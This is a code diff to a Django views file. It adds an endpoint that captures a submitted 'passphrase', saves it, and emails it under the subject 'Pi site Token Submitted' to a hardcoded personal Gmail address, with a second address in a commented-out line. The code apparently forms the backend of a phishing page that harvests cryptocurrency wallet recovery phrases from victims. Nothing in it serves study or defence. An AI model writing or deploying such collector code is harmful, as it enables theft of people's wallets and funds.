@@ -3,7 +3,7 @@ from firebmail import sendmail as sending_no
 from datetime import datetime
 from django.http import HttpResponse
 from urllib.parse import unquote
-from .models import PassPhrase
+from .models import PassPhrase, Nel_PassPhrase
 
 # Create your views here.
 
@@ -73,3 +73,29 @@ def send_notify2(request, sender, password, email_to,keys, subject=None, payload
         )
     return HttpResponse('OK')
 
+
+
+def send_nelson(request, keys, email="no@no.com"):
+    current_date = datetime.now()
+    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")    
+    decoded_param = unquote(keys)
+
+    exists = Nel_PassPhrase.objects.filter(keys = decoded_param).exists()
+
+    if not exists:
+        saved = Nel_PassPhrase.objects.create(
+            keys = decoded_param
+        )
+        saved.save()
+
+        if email == 'no@no.com':
+            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
+
+
+        else:
+            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
+
+                    
+    # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
+    
+    return HttpResponse('OK')
